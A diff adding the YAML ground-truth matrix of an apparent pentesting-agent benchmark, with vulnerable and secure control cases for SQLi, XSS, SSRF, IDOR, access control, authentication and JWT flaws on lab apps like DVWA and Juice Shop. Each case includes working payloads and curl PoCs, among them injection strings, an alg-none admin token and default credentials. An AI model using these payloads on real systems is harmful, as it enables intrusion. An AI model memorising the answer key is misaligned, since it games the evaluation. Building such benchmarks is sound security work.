@@ -1,0 +1,1426 @@
+version: 2.0.0
+benchmark_metadata:
+  description: Pentesa Master Ground Truth Matrix (Expanded 3A-FIX Round)
+  categories_covered: 15
+  vulnerable_cases: 45
+  secure_control_cases: 18
+  total_cases: 63
+  target_applications:
+  - name: Pentesa Bench
+    role: Primary Controlled Paired Vulnerable/Secure Microservice
+  - name: OWASP Juice Shop
+    role: Third-Party Modern SPA Target (Recall Only)
+  - name: DVWA
+    role: Third-Party Multi-tier PHP Target (Recall + Impossible Controls)
+  - name: crAPI
+    role: Third-Party Microservices REST API Target (Recall Only)
+  - name: OWASP WebGoat
+    role: Third-Party Enterprise Java Target (Recall Only)
+cases:
+- id: GT-SQLI-01-V
+  app: pentesa-bench
+  endpoint: /sqli/search
+  method: GET
+  parameter: q
+  category: SQL Injection
+  wstg_id: WSTG-INPV-05
+  cwe: CWE-89
+  vulnerable: true
+  known_vulnerability_condition: 'Direct SQLite string interpolation: SELECT id, name, description, price FROM products WHERE
+    name LIKE ''%{q}%''.'
+  expected_secure_behavior: Input parameterized using prepared statement bindings.
+  expected_discovery_result: GET parameter 'q' discovered via API discovery.
+  expected_agent_behavior: VulnerabilityAgent detects anomalous response delta and database records returned on union/boolean
+    payloads.
+  expected_reproduction_evidence: HTTP GET with payload q=' OR 1=1-- returns hidden record FLAG{PENTESA_SQLI_INJECTION_VERIFIED_8b12}.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Should not be reported if single quote returns clean 400 validation error without database
+    leakage.
+  pass_fail_criteria: PASS if reported with CWE-89, parameter 'q', and valid curl reproduction returning leaked database entities.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/sqli/search?q=%27+OR+1%3D1--'
+    params:
+      q: ''' OR 1=1--'
+  expected_vulnerable_signature: FLAG{PENTESA_SQLI_INJECTION_VERIFIED_8b12}
+- id: GT-SQLI-02-V
+  app: juiceshop
+  endpoint: /rest/products/search
+  method: GET
+  parameter: q
+  category: SQL Injection
+  wstg_id: WSTG-INPV-05
+  cwe: CWE-89
+  vulnerable: true
+  known_vulnerability_condition: Unsanitized product search query concatenated into raw SQLite query string.
+  expected_secure_behavior: Input parameterized through prepared statements.
+  expected_discovery_result: Endpoint discovered with GET parameter 'q'.
+  expected_agent_behavior: Detects anomalous database records on union injection.
+  expected_reproduction_evidence: HTTP GET with payload q=apple'))-- returns full product table dump.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Should not be reported if query parameter only returns standard search result.
+  pass_fail_criteria: PASS if reported with CWE-89 and valid curl reproduction.
+  reference_poc:
+    curl: curl -s 'http://juiceshop:3000/rest/products/search?q=apple%27%29%29--'
+    params:
+      q: apple'))--
+  expected_vulnerable_signature: Christmas Special
+- id: GT-SQLI-03-V
+  app: dvwa
+  endpoint: /vulnerabilities/sqli/
+  method: GET
+  parameter: id
+  category: SQL Injection
+  wstg_id: WSTG-INPV-05
+  cwe: CWE-89
+  vulnerable: true
+  known_vulnerability_condition: DVWA low/medium security concatenates raw input into MySQL query.
+  expected_secure_behavior: Input cast to integer or parameterized via PDO.
+  expected_discovery_result: Endpoint discovered with GET parameter 'id'.
+  expected_agent_behavior: Detects table dump across all user IDs on boolean payload.
+  expected_reproduction_evidence: HTTP GET with id=1' OR '1'='1 returns all accounts.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Should not be reported on numeric inputs without database anomaly.
+  pass_fail_criteria: PASS if reported with CWE-89.
+  reference_poc:
+    curl: curl -s 'http://dvwa:80/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit'
+    params:
+      id: 1' OR '1'='1
+      Submit: Submit
+  expected_vulnerable_signature: 'Surname: admin'
+- id: GT-SQLI-01-S
+  app: pentesa-bench
+  endpoint: /sqli/secure
+  method: GET
+  parameter: q
+  category: SQL Injection
+  wstg_id: WSTG-INPV-05
+  cwe: CWE-89
+  vulnerable: false
+  known_vulnerability_condition: Parameterized SQLite query with prepared statement bindings.
+  expected_secure_behavior: SQL metacharacters treated as literal characters; zero database alteration.
+  expected_discovery_result: Endpoint discovered with parameter 'q'.
+  expected_agent_behavior: Probes observe consistent rejection/literal matching; no finding emitted.
+  expected_reproduction_evidence: None (zero finding emitted).
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting any vulnerability on this endpoint is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if platform generates 0 confirmed findings.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/sqli/secure?q=%27+OR+1%3D1--'
+    params:
+      q: ''' OR 1=1--'
+  expected_secure_signature: 'count": 0'
+- id: GT-SQLI-02-S
+  app: dvwa
+  endpoint: /vulnerabilities/sqli/
+  method: GET
+  parameter: id
+  category: SQL Injection
+  wstg_id: WSTG-INPV-05
+  cwe: CWE-89
+  vulnerable: false
+  known_vulnerability_condition: DVWA impossible mode uses PDO prepared statements with integer casting.
+  expected_secure_behavior: Non-numeric input rejected; parameterized query prevents execution.
+  expected_discovery_result: Endpoint discovered with parameter 'id'.
+  expected_agent_behavior: Probers observe rejection; no finding emitted.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Must be classified as FALSE POSITIVE if reported on impossible mode.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://dvwa:80/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit'
+    params:
+      id: 1' OR '1'='1
+      Submit: Submit
+  expected_secure_signature: User ID is missing
+- id: GT-XSS-01-V
+  app: pentesa-bench
+  endpoint: /xss/reflect
+  method: GET
+  parameter: name
+  category: XSS
+  wstg_id: WSTG-INPV-01
+  cwe: CWE-79
+  vulnerable: true
+  known_vulnerability_condition: Parameter 'name' reflected unescaped directly in HTML response.
+  expected_secure_behavior: HTML entity encoding applied to all user input reflected in DOM.
+  expected_discovery_result: Endpoint discovered with GET parameter 'name'.
+  expected_agent_behavior: Detects unescaped script tags in HTML body.
+  expected_reproduction_evidence: curl returns verbatim <script>alert(1)</script> in response body.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Should not report if entities are encoded (&lt;script&gt;).
+  pass_fail_criteria: PASS if reported with CWE-79 and verified unescaped reflection.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/xss/reflect?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+    params:
+      name: <script>alert(1)</script>
+  expected_vulnerable_signature: <script>alert(1)</script>
+- id: GT-XSS-02-V
+  app: dvwa
+  endpoint: /vulnerabilities/xss_r/
+  method: GET
+  parameter: name
+  category: XSS
+  wstg_id: WSTG-INPV-01
+  cwe: CWE-79
+  vulnerable: true
+  known_vulnerability_condition: DVWA low/medium reflects unsanitized 'name' parameter inside <pre> tag.
+  expected_secure_behavior: htmlspecialchars encoding.
+  expected_discovery_result: GET parameter 'name' identified.
+  expected_agent_behavior: Identifies script execution payload reflected intact.
+  expected_reproduction_evidence: Unescaped HTML tags present in response.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if encoded.
+  pass_fail_criteria: PASS if reported with CWE-79.
+  reference_poc:
+    curl: curl -s 'http://dvwa:80/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+    params:
+      name: <script>alert(1)</script>
+  expected_vulnerable_signature: <script>alert(1)</script>
+- id: GT-XSS-03-V
+  app: pentesa-bench
+  endpoint: /xss/reflect
+  method: GET
+  parameter: name
+  category: XSS
+  wstg_id: WSTG-INPV-01
+  cwe: CWE-79
+  vulnerable: true
+  known_vulnerability_condition: Attribute/event handler injection via <img> tag in parameter 'name'.
+  expected_secure_behavior: Context-aware attribute sanitization.
+  expected_discovery_result: GET parameter 'name' discovered.
+  expected_agent_behavior: Validates payload with attribute event handlers.
+  expected_reproduction_evidence: Verbatim <img src=x onerror=alert(1)> in HTML body.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if tag brackets stripped or encoded.
+  pass_fail_criteria: PASS if reported with CWE-79.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/xss/reflect?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E'
+    params:
+      name: <img src=x onerror=alert(1)>
+  expected_vulnerable_signature: <img src=x onerror=alert(1)>
+- id: GT-XSS-01-S
+  app: pentesa-bench
+  endpoint: /xss/secure
+  method: GET
+  parameter: name
+  category: XSS
+  wstg_id: WSTG-INPV-01
+  cwe: CWE-79
+  vulnerable: false
+  known_vulnerability_condition: HTML entity escaping via html.escape(name, quote=True).
+  expected_secure_behavior: Characters <, >, &, ", ' converted to safe HTML entities.
+  expected_discovery_result: GET parameter 'name' discovered.
+  expected_agent_behavior: Observes encoded output (&lt;script&gt;); suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting XSS on /xss/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/xss/secure?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+    params:
+      name: <script>alert(1)</script>
+  expected_secure_signature: '&lt;script&gt;alert(1)&lt;/script&gt;'
+- id: GT-XSS-02-S
+  app: dvwa
+  endpoint: /vulnerabilities/xss_r/
+  method: GET
+  parameter: name
+  category: XSS
+  wstg_id: WSTG-INPV-01
+  cwe: CWE-79
+  vulnerable: false
+  known_vulnerability_condition: DVWA impossible mode uses htmlspecialchars() escaping.
+  expected_secure_behavior: Complete entity encoding prevents client-side execution.
+  expected_discovery_result: Parameter 'name' identified.
+  expected_agent_behavior: Observes encoding; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Must be classified as FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://dvwa:80/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+    params:
+      name: <script>alert(1)</script>
+  expected_secure_signature: '&lt;script&gt;'
+- id: GT-SSRF-01-V
+  app: pentesa-bench
+  endpoint: /ssrf/fetch
+  method: GET
+  parameter: url
+  category: SSRF
+  wstg_id: WSTG-INPV-19
+  cwe: CWE-918
+  vulnerable: true
+  known_vulnerability_condition: Fetches arbitrary user-supplied URL without DNS resolution or private IP checks.
+  expected_secure_behavior: Strict IP allowlist; blocks RFC 1918 and loopback ranges.
+  expected_discovery_result: Parameter 'url' discovered via API extraction.
+  expected_agent_behavior: Detects internal network service response or canary HTTP trap interaction.
+  expected_reproduction_evidence: Canary trap on port 9099 receives inbound request with token.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Should not report if external URL fetch fails or connection refused.
+  pass_fail_criteria: PASS if reported with CWE-918 and valid reproduction.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/ssrf/fetch?url=http://bench-canary:9099/trap/ssrf'
+    params:
+      url: http://bench-canary:9099/trap/ssrf
+  expected_vulnerable_signature: canary
+- id: GT-SSRF-02-V
+  app: pentesa-bench
+  endpoint: /ssrf/fetch
+  method: GET
+  parameter: url
+  category: SSRF
+  wstg_id: WSTG-INPV-19
+  cwe: CWE-918
+  vulnerable: true
+  known_vulnerability_condition: Loopback service probe via 127.0.0.1:8080 internal health endpoint.
+  expected_secure_behavior: Loopback addresses (127.0.0.0/8) blocked before connection.
+  expected_discovery_result: Parameter 'url' identified.
+  expected_agent_behavior: Receives loopback server JSON response.
+  expected_reproduction_evidence: Internal health status returned via SSRF proxy.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if connection refused.
+  pass_fail_criteria: PASS if reported with CWE-918.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/ssrf/fetch?url=http://127.0.0.1:8080/healthz'
+    params:
+      url: http://127.0.0.1:8080/healthz
+  expected_vulnerable_signature: healthy
+- id: GT-SSRF-03-V
+  app: crapi
+  endpoint: /workshop/api/merchant/contact_mechanic
+  method: POST
+  parameter: mechanic_api
+  category: SSRF
+  wstg_id: WSTG-INPV-19
+  cwe: CWE-918
+  vulnerable: true
+  known_vulnerability_condition: crAPI mechanic contact endpoint forwards request to arbitrary internal host.
+  expected_secure_behavior: Mechanic endpoints restricted to pre-registered partner domain list.
+  expected_discovery_result: POST endpoint identified with body parameter 'mechanic_api'.
+  expected_agent_behavior: Detects out-of-band request initiation.
+  expected_reproduction_evidence: HTTP response containing relayed service response.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if URL validation rejects non-registered domain.
+  pass_fail_criteria: PASS if reported with CWE-918.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"mechanic_api":"http://bench-canary:9099/trap/crapi"}''
+      ''http://crapi-workshop:8080/workshop/api/merchant/contact_mechanic'''
+    json:
+      mechanic_api: http://bench-canary:9099/trap/crapi
+  expected_vulnerable_signature: contact
+- id: GT-SSRF-01-S
+  app: pentesa-bench
+  endpoint: /ssrf/secure
+  method: GET
+  parameter: url
+  category: SSRF
+  wstg_id: WSTG-INPV-19
+  cwe: CWE-918
+  vulnerable: false
+  known_vulnerability_condition: Pre-connection DNS resolution with strict RFC 1918 and loopback blocklist.
+  expected_secure_behavior: Requests to private/loopback/internal IPs rejected with HTTP 400 Bad Request.
+  expected_discovery_result: Parameter 'url' discovered.
+  expected_agent_behavior: Observes 400 rejection; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting SSRF on /ssrf/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/ssrf/secure?url=http://127.0.0.1:8080/healthz'
+    params:
+      url: http://127.0.0.1:8080/healthz
+  expected_secure_signature: Blocked destination
+- id: GT-IDOR-01-V
+  app: pentesa-bench
+  endpoint: /api/user/{user_id}/profile
+  method: GET
+  parameter: user_id
+  category: IDOR / BOLA
+  wstg_id: WSTG-ATHZ-04
+  cwe: CWE-639
+  vulnerable: true
+  known_vulnerability_condition: Direct object reference without verifying caller session against requested user_id.
+  expected_secure_behavior: 'Enforce session ownership: caller user_id must match requested profile id.'
+  expected_discovery_result: Endpoint discovered with path variable user_id.
+  expected_agent_behavior: Differential testing confirms access to arbitrary cross-tenant profile.
+  expected_reproduction_evidence: HTTP GET to /api/user/1002/profile returns Bob's private memo and SSN.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if endpoint requires matching bearer token.
+  pass_fail_criteria: PASS if reported with CWE-639.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/api/user/1002/profile'
+    params:
+      user_id: '1002'
+  expected_vulnerable_signature: FLAG{PENTESA_IDOR_SENSITIVE_LEAK_991b}
+- id: GT-IDOR-02-V
+  app: crapi
+  endpoint: /identity/api/v2/vehicle/{vehicleId}/location
+  method: GET
+  parameter: vehicleId
+  category: IDOR / BOLA
+  wstg_id: WSTG-ATHZ-04
+  cwe: CWE-639
+  vulnerable: true
+  known_vulnerability_condition: crAPI vehicle tracking endpoint permits User A to query GPS location of vehicle owned by
+    User B.
+  expected_secure_behavior: Query repository enforces WHERE vehicle_id = :id AND owner_id = :caller_id.
+  expected_discovery_result: Endpoint identified via API discovery.
+  expected_agent_behavior: Cross-account verification reveals unauthorized telemetry retrieval.
+  expected_reproduction_evidence: GPS coordinates of unowned vehicle returned.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if ownership check returns 403.
+  pass_fail_criteria: PASS if reported with CWE-639.
+  reference_poc:
+    curl: 'curl -s -H ''Authorization: Bearer <user_token>'' ''http://crapi-identity:8080/identity/api/v2/vehicle/12345/location'''
+    params:
+      vehicleId: '12345'
+  expected_vulnerable_signature: location
+- id: GT-IDOR-03-V
+  app: crapi
+  endpoint: /workshop/api/shop/orders/{order_id}
+  method: GET
+  parameter: order_id
+  category: IDOR / BOLA
+  wstg_id: WSTG-ATHZ-04
+  cwe: CWE-639
+  vulnerable: true
+  known_vulnerability_condition: crAPI workshop order retrieval permits arbitrary order ID query across customers.
+  expected_secure_behavior: Customer ID scoped to authenticated JWT subject.
+  expected_discovery_result: Path variable order_id identified.
+  expected_agent_behavior: Retrieves other customer's order invoice.
+  expected_reproduction_evidence: Foreign customer invoice JSON returned.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if 403 returned on foreign order.
+  pass_fail_criteria: PASS if reported with CWE-639.
+  reference_poc:
+    curl: 'curl -s -H ''Authorization: Bearer <user_token>'' ''http://crapi-workshop:8080/workshop/api/shop/orders/9999'''
+    params:
+      order_id: '9999'
+  expected_vulnerable_signature: order
+- id: GT-IDOR-01-S
+  app: pentesa-bench
+  endpoint: /api/user/{user_id}/secure-profile
+  method: GET
+  parameter: user_id
+  category: IDOR / BOLA
+  wstg_id: WSTG-ATHZ-04
+  cwe: CWE-639
+  vulnerable: false
+  known_vulnerability_condition: Ownership validation checks Authorization Bearer token matches user_id.
+  expected_secure_behavior: Returns 401 Unauthenticated or 403 Forbidden on tenant mismatch.
+  expected_discovery_result: Endpoint identified with parameter user_id.
+  expected_agent_behavior: Cross-tenant probe receives 403; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting BOLA on this endpoint is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: 'curl -s -H ''Authorization: Bearer token_user_1001'' ''http://pentesa-bench:8080/api/user/1002/secure-profile'''
+    params:
+      user_id: '1002'
+    headers:
+      Authorization: Bearer token_user_1001
+  expected_secure_signature: Forbidden
+- id: GT-BAC-01-V
+  app: pentesa-bench
+  endpoint: /admin/config
+  method: GET
+  parameter: Authorization
+  category: Broken Access Control
+  wstg_id: WSTG-ATHZ-02
+  cwe: CWE-285
+  vulnerable: true
+  known_vulnerability_condition: Administrative configuration accessible unauthenticated without bearer token.
+  expected_secure_behavior: Strict role authorization check in middleware.
+  expected_discovery_result: Administrative endpoint discovered via crawl/directory fuzzing.
+  expected_agent_behavior: Confirms sensitive configuration dump on unauthenticated request.
+  expected_reproduction_evidence: HTTP 200 response contains admin_secret_key FLAG{PENTESA_BAC_ADMIN_LEAK_44e1}.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if 401/403 returned without credentials.
+  pass_fail_criteria: PASS if reported with CWE-285.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/admin/config'
+  expected_vulnerable_signature: FLAG{PENTESA_BAC_ADMIN_LEAK_44e1}
+- id: GT-BAC-02-V
+  app: juiceshop
+  endpoint: /rest/admin/application-configuration
+  method: GET
+  parameter: Authorization
+  category: Broken Access Control
+  wstg_id: WSTG-ATHZ-02
+  cwe: CWE-285
+  vulnerable: true
+  known_vulnerability_condition: Juice Shop unauthenticated application configuration exposure.
+  expected_secure_behavior: Admin authorization check required.
+  expected_discovery_result: Endpoint discovered via crawl.
+  expected_agent_behavior: Retrieves internal application configuration without authentication.
+  expected_reproduction_evidence: Full application configuration JSON returned.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if 401 returned.
+  pass_fail_criteria: PASS if reported with CWE-285.
+  reference_poc:
+    curl: curl -s 'http://juiceshop:3000/rest/admin/application-configuration'
+  expected_vulnerable_signature: application
+- id: GT-BAC-03-V
+  app: crapi
+  endpoint: /identity/api/v2/user/videos/convert_video
+  method: POST
+  parameter: video_url
+  category: Broken Access Control
+  wstg_id: WSTG-ATHZ-02
+  cwe: CWE-285
+  vulnerable: true
+  known_vulnerability_condition: crAPI administrative function accessible by normal authenticated users (BFLA).
+  expected_secure_behavior: Role-based access control enforces admin role.
+  expected_discovery_result: Endpoint identified via API schema.
+  expected_agent_behavior: Non-admin user successfully triggers admin function.
+  expected_reproduction_evidence: Conversion task created by standard user.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if 403 returned for non-admin.
+  pass_fail_criteria: PASS if reported with CWE-285.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Authorization: Bearer <user_token>'' ''http://crapi-identity:8080/identity/api/v2/user/videos/convert_video'''
+    json:
+      video_url: http://example.com/test.mp4
+  expected_vulnerable_signature: convert
+- id: GT-BAC-01-S
+  app: pentesa-bench
+  endpoint: /admin/secure-config
+  method: GET
+  parameter: Authorization
+  category: Broken Access Control
+  wstg_id: WSTG-ATHZ-02
+  cwe: CWE-285
+  vulnerable: false
+  known_vulnerability_condition: Requires valid admin session token; rejects missing or invalid credentials.
+  expected_secure_behavior: HTTP 401 Unauthorized or HTTP 403 Forbidden on missing/insufficient credentials.
+  expected_discovery_result: Endpoint discovered via crawl.
+  expected_agent_behavior: Receives 401; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting BAC on /admin/secure-config is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: curl -s 'http://pentesa-bench:8080/admin/secure-config'
+  expected_secure_signature: Authentication token required
+- id: GT-AUTH-01-V
+  app: pentesa-bench
+  endpoint: /auth/login
+  method: POST
+  parameter: password
+  category: Authentication weaknesses
+  wstg_id: WSTG-ATHN-02
+  cwe: CWE-287
+  vulnerable: true
+  known_vulnerability_condition: Accepts well-known default credentials (admin:admin) without password change enforcement.
+  expected_secure_behavior: Enforces strong unique password on deployment; rejects default credentials.
+  expected_discovery_result: Login form discovered.
+  expected_agent_behavior: Default credential check authenticates administrative session.
+  expected_reproduction_evidence: POST with admin:admin returns session token.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if default credentials return 401.
+  pass_fail_criteria: PASS if reported with CWE-287.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"username":"admin","password":"admin"}'' ''http://pentesa-bench:8080/auth/login'''
+    json:
+      username: admin
+      password: admin
+  expected_vulnerable_signature: session_admin_weak_default_creds
+- id: GT-AUTH-02-V
+  app: crapi
+  endpoint: /identity/api/auth/v2/check-otp
+  method: POST
+  parameter: otp
+  category: Authentication weaknesses
+  wstg_id: WSTG-ATHN-03
+  cwe: CWE-307
+  vulnerable: true
+  known_vulnerability_condition: crAPI OTP verification lacks rate limiting or account lockout, allowing unthrottled brute
+    force.
+  expected_secure_behavior: Locks account or invalidates OTP after 3-5 failed verification attempts.
+  expected_discovery_result: Password reset OTP endpoint discovered.
+  expected_agent_behavior: Identifies lack of lockout on sequential authentication failures.
+  expected_reproduction_evidence: Multiple incorrect OTP guesses processed without 429 rate limit.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if 429 lockout triggered.
+  pass_fail_criteria: PASS if reported with CWE-307.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"email":"victim@example.com","otp":"0000"}'' ''http://crapi-identity:8080/identity/api/auth/v2/check-otp'''
+    json:
+      email: victim@example.com
+      otp: '0000'
+  expected_vulnerable_signature: Invalid OTP
+- id: GT-AUTH-03-V
+  app: dvwa
+  endpoint: /vulnerabilities/brute/
+  method: GET
+  parameter: password
+  category: Authentication weaknesses
+  wstg_id: WSTG-ATHN-03
+  cwe: CWE-307
+  vulnerable: true
+  known_vulnerability_condition: DVWA brute force endpoint has zero attempt capping or account lockout.
+  expected_secure_behavior: Account lockout after successive invalid attempts.
+  expected_discovery_result: Brute force login form discovered.
+  expected_agent_behavior: Observes unlimited credential attempts permitted.
+  expected_reproduction_evidence: Successful login achieved via credential enumeration without lockout.
+  expected_severity: MEDIUM
+  expected_false_positive_behavior: Do not report if IP blocked after 5 attempts.
+  pass_fail_criteria: PASS if reported with CWE-307.
+  reference_poc:
+    curl: curl -s 'http://dvwa:80/vulnerabilities/brute/?username=admin&password=password&Login=Login'
+    params:
+      username: admin
+      password: password
+      Login: Login
+  expected_vulnerable_signature: Welcome to the password protected area
+- id: GT-AUTH-01-S
+  app: pentesa-bench
+  endpoint: /auth/secure-login
+  method: POST
+  parameter: password
+  category: Authentication weaknesses
+  wstg_id: WSTG-ATHN-03
+  cwe: CWE-307
+  vulnerable: false
+  known_vulnerability_condition: Strict lockout enforcing HTTP 429 after 5 failed authentication attempts.
+  expected_secure_behavior: Account locked out; brute force attacks thwarted.
+  expected_discovery_result: Login endpoint identified.
+  expected_agent_behavior: Observes 429 lockout triggered; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting weak lockout on /auth/secure-login is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"username":"admin","password":"wrong"}'' ''http://pentesa-bench:8080/auth/secure-login'''
+    json:
+      username: admin
+      password: wrong
+  expected_secure_signature: Invalid credentials
+- id: GT-JWT-01-V
+  app: pentesa-bench
+  endpoint: /jwt/profile
+  method: GET
+  parameter: Authorization
+  category: JWT weaknesses
+  wstg_id: WSTG-SESS-01
+  cwe: CWE-347
+  vulnerable: true
+  known_vulnerability_condition: Accepts JWT tokens with algorithm 'none', bypassing signature verification.
+  expected_secure_behavior: Explicitly whitelist allowed cryptographic algorithms (RS256, HS256); reject 'none'.
+  expected_discovery_result: JWT bearer endpoint discovered.
+  expected_agent_behavior: Detects acceptance of unsigned forged admin token.
+  expected_reproduction_evidence: HTTP 200 with admin profile returned for token eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if unsigned token rejected with 401.
+  pass_fail_criteria: PASS if reported with CWE-347.
+  reference_poc:
+    curl: 'curl -s -H ''Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.''
+      ''http://pentesa-bench:8080/jwt/profile'''
+    headers:
+      Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+  expected_vulnerable_signature: admin
+- id: GT-JWT-02-V
+  app: pentesa-bench
+  endpoint: /jwt/profile
+  method: GET
+  parameter: Authorization
+  category: JWT weaknesses
+  wstg_id: WSTG-SESS-01
+  cwe: CWE-347
+  vulnerable: true
+  known_vulnerability_condition: JWT secret signed with trivial dictionary key 'secret123' allowing offline cracking.
+  expected_secure_behavior: Cryptographically random high-entropy secret >= 256 bits.
+  expected_discovery_result: JWT endpoint identified.
+  expected_agent_behavior: Identifies weak HMAC secret key.
+  expected_reproduction_evidence: Forged token signed with secret123 accepted as admin.
+  expected_severity: HIGH
+  expected_false_positive_behavior: Do not report if secret cracking fails.
+  pass_fail_criteria: PASS if reported with CWE-347.
+  reference_poc:
+    curl: 'curl -s -H ''Authorization: Bearer <weak_secret_jwt>'' ''http://pentesa-bench:8080/jwt/profile'''
+    headers:
+      Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+  expected_vulnerable_signature: admin
+- id: GT-JWT-03-V
+  app: crapi
+  endpoint: /identity/api/auth/v2/check-verify-token
+  method: POST
+  parameter: token
+  category: JWT weaknesses
+  wstg_id: WSTG-SESS-01
+  cwe: CWE-347
+  vulnerable: true
+  known_vulnerability_condition: crAPI JWT signature validation bypass via key confusion.
+  expected_secure_behavior: Strict asymmetric key validation.
+  expected_discovery_result: Token verification endpoint identified.
+  expected_agent_behavior: Detects signature validation bypass.
+  expected_reproduction_evidence: Forged verification token accepted.
+  expected_severity: CRITICAL
+  expected_false_positive_behavior: Do not report if 401 returned.
+  pass_fail_criteria: PASS if reported with CWE-347.
+  reference_poc:
+    curl: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"token":"invalid"}'' ''http://crapi-identity:8080/identity/api/auth/v2/check-verify-token'''
+    json:
+      token: invalid
+  expected_vulnerable_signature: token
+- id: GT-JWT-01-S
+  app: pentesa-bench
+  endpoint: /jwt/secure
+  method: GET
+  parameter: Authorization
+  category: JWT weaknesses
+  wstg_id: WSTG-SESS-01
+  cwe: CWE-347
+  vulnerable: false
+  known_vulnerability_condition: Enforces RS256 with strict public key verification; rejects algorithm none.
+  expected_secure_behavior: Returns 401 Unauthorized on unsigned or invalidly signed tokens.
+  expected_discovery_result: JWT endpoint identified.
+  expected_agent_behavior: Observes 401 on forged tokens; suppresses finding.
+  expected_reproduction_evidence: None.
+  expected_severity: INFO
+  expected_false_positive_behavior: Reporting JWT flaw on /jwt/secure is a FALSE POSITIVE.
+  pass_fail_criteria: PASS if 0 findings emitted.
+  reference_poc:
+    curl: 'curl -s -H ''Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.''
+      ''http://pentesa-bench:8080/jwt/secure'''
+    headers:
+      Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+  expected_secure_signature: Invalid JWT Token
+- id: GT-UPLD-01-V
+  app: pentesa-bench
+  endpoint: /upload/file
+  method: POST
+  parameter: file
+  category: File upload vulnerabilities
+  wstg_id: WSTG-BUSL-08
+  cwe: CWE-434
+  vulnerable: true
+  known_vulnerability_condition: Accepts arbitrary executable file extensions (.php, .py, .sh) and saves to web-accessible
+    directory.
+  expected_secure_behavior: Validate file extensions via strict whitelist; store files outside web root.
+  expected_discovery_result: File upload form discovered.
+  expected_agent_behavior: Uploads test script and confirms retention.
